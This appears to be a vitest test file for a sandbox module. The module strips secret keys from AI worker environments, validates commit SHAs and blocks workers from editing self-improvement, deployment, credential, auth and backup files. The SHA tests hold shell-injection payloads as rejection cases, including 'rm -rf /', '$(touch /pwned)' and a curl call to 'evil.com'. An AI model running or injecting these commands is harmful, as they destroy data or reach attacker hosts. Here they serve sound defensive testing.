import { describe, expect, it } from "vitest";
import {
  WORKER_DENYLIST_PATTERNS,
  WORKER_SECRET_ENV_KEYS,
  scrubWorkerEnv,
  isValidCommitSha,
  findDenylistViolations,
} from "../backend/utils/worker-sandbox.js";

describe("scrubWorkerEnv", () => {
  it("removes all known secret keys", () => {
    const env = {
      PATH: "/usr/bin",
      OPENAI_API_KEY: "sk-secret",
      GROK_API_KEY: "grok-secret",
      WEB_PASSWORD: "p455w0rd",
      GH_TOKEN: "keep-me",
    };
    const out = scrubWorkerEnv(env);
    expect(out.OPENAI_API_KEY).toBeUndefined();
    expect(out.GROK_API_KEY).toBeUndefined();
    expect(out.WEB_PASSWORD).toBeUndefined();
    expect(out.PATH).toBe("/usr/bin");
    expect(out.GH_TOKEN).toBe("keep-me");
  });

  it("does not mutate input env", () => {
    const env = { OPENAI_API_KEY: "sk-secret", PATH: "/usr/bin" };
    scrubWorkerEnv(env);
    expect(env.OPENAI_API_KEY).toBe("sk-secret");
  });

  it("strips every key listed in WORKER_SECRET_ENV_KEYS", () => {
    const env: NodeJS.ProcessEnv = {};
    for (const k of WORKER_SECRET_ENV_KEYS) env[k] = "value";
    const out = scrubWorkerEnv(env);
    for (const k of WORKER_SECRET_ENV_KEYS) {
      expect(out[k]).toBeUndefined();
    }
  });
});

describe("isValidCommitSha", () => {
  it("accepts valid short and long SHAs", () => {
    expect(isValidCommitSha("abc1234")).toBe(true);
    expect(isValidCommitSha("ff1b7f2f")).toBe(true);
    expect(isValidCommitSha("0123456789abcdef0123456789abcdef01234567")).toBe(true);
  });

  it("rejects shell-injection payloads", () => {
    expect(isValidCommitSha("abc1234; rm -rf /")).toBe(false);
    expect(isValidCommitSha("$(touch /pwned)")).toBe(false);
    expect(isValidCommitSha("`whoami`")).toBe(false);
    expect(isValidCommitSha("abc1234 && curl evil.com")).toBe(false);
    expect(isValidCommitSha("abc1234\nrm -rf /")).toBe(false);
  });

  it("rejects too-short, too-long, uppercase, non-hex", () => {
    expect(isValidCommitSha("abc")).toBe(false);
    expect(isValidCommitSha("0".repeat(41))).toBe(false);
    expect(isValidCommitSha("ABC1234")).toBe(false);
    expect(isValidCommitSha("ghijklm")).toBe(false);
    expect(isValidCommitSha("")).toBe(false);
  });
});

describe("findDenylistViolations", () => {
  it("flags self-improve.ts and lifeline files", () => {
    const v = findDenylistViolations([
      "backend/self-improve.ts",
      "backend/self-improve-prompt.ts",
      "backend/self-improve-queue.ts",
      "backend/brain-workers.ts",
      "backend/sub-agent-worker.ts",
      "backend/utils/worker-sandbox.ts",
      "entrypoint.sh",
      "Dockerfile",
      ".env",
      ".env.production",
      ".github/workflows/deploy.yml",
      "backend/web/auth.ts",
      "backend/memory/backup.ts",
    ]);
    expect(v.length).toBe(13);
  });

  it("does not flag legitimate brain files", () => {
    const v = findDenylistViolations([
      "backend/brain.ts",
      "backend/brain-ticks.ts",
      "backend/memory/graph.ts",
      "frontend/app/pages/index.vue",
      "README.md",
    ]);
    expect(v).toEqual([]);
  });

  it("normalizes leading ./ and trims whitespace", () => {
    const v = findDenylistViolations(["./backend/self-improve.ts", "  entrypoint.sh  "]);
    expect(v).toEqual(["backend/self-improve.ts", "entrypoint.sh"]);
  });

  it("ignores empty entries", () => {
    expect(findDenylistViolations(["", "   ", "backend/brain.ts"])).toEqual([]);
  });

  it("denylist patterns array is non-empty (sanity)", () => {
    expect(WORKER_DENYLIST_PATTERNS.length).toBeGreaterThan(5);
  });
});
